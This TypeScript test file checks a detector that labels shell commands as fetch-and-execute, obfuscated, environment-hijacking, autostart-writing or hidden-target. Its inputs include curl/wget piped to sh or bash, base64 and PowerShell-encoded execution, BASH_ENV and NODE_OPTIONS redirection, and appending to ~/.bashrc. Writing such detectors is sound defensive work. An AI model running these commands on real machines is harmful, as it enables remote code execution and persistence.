import { test } from 'node:test';
import assert from 'node:assert/strict';
import { analyzeCommand } from '../dist/signals/command.js';

function kinds(cmd: string): string[] {
  return analyzeCommand(cmd).map((s) => s.kind);
}

test('flags fetch-and-execute pipelines', () => {
  assert.ok(kinds('curl -fsSL http://x/i.sh | sh').includes('fetch-execute'));
  assert.ok(kinds('wget -qO- http://x | bash').includes('fetch-execute'));
  assert.ok(kinds('iwr http://x | iex').includes('fetch-execute'));
  assert.ok(kinds('bash -c "$(curl http://x)"').includes('fetch-execute'));
});

test('does not flag a plain network call with no execution', () => {
  assert.ok(!kinds('curl -o out.json http://x/data.json').includes('fetch-execute'));
});

test('flags obfuscation', () => {
  assert.ok(kinds('echo Zm9v | base64 -d').includes('obfuscated'));
  assert.ok(kinds('node -e "eval(atob(x))"').includes('obfuscated'));
  assert.ok(kinds('powershell -enc AAAAAAAAAAAAAAAAAAAA').includes('obfuscated'));
});

test('flags interpreter-redirect env vars but not a node_modules PATH', () => {
  assert.ok(kinds('BASH_ENV=./x.sh some-cmd').includes('env-hijack'));
  assert.ok(kinds('NODE_OPTIONS=--require=./x node app').includes('env-hijack'));
  assert.ok(!kinds('PATH="./node_modules/.bin:$PATH"').includes('env-hijack'));
});

test('flags writing into another autostart surface', () => {
  assert.ok(kinds('echo evil >> ~/.bashrc').includes('writes-autostart'));
  assert.ok(kinds('crontab -l').includes('writes-autostart'));
});

test('flags a dotfile invoked as an executable, not a normal relative path', () => {
  assert.ok(kinds('node .cache.js').includes('hidden-target'));
  assert.ok(!kinds('node ./server.js').includes('hidden-target'));
  assert.ok(!kinds('node ./.mcp/server.js').includes('hidden-target'));
});

test('flags os-branching', () => {
  assert.ok(kinds('if [ "$(uname)" = Darwin ]; then x; fi').includes('os-branch'));
});

test('a benign build command raises no signals', () => {
  assert.deepEqual(analyzeCommand('npm run build'), []);
  assert.deepEqual(analyzeCommand('node-gyp rebuild'), []);
  assert.deepEqual(analyzeCommand('tsc -p .'), []);
  assert.deepEqual(analyzeCommand('npx lint-staged'), []);
});
